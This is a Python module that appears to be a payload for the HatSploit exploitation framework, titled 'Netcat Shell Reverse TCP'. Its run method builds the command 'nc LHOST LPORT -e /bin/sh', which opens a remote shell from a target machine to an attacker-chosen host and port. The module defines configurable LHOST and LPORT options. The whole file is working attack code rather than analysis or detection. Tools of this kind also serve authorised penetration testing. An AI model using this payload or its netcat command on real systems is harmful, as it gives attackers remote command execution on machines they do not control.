#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload
from hatsploit.utils.tcp import TCPClient


class HatSploitPayload(Payload):
    details = {
        'Category': "single",
        'Name': "Netcat Shell Reverse TCP",
        'Payload': "unix/generic/netcat_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Netcat shell reverse TCP payload.",
        'Comments': [
            ''
        ],
        'Architecture': "generic",
        'Platform': "unix",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        local_host, local_port = self.parse_options(self.options)

        payload = f"nc {local_host} {local_port} -e /bin/sh"
        return payload
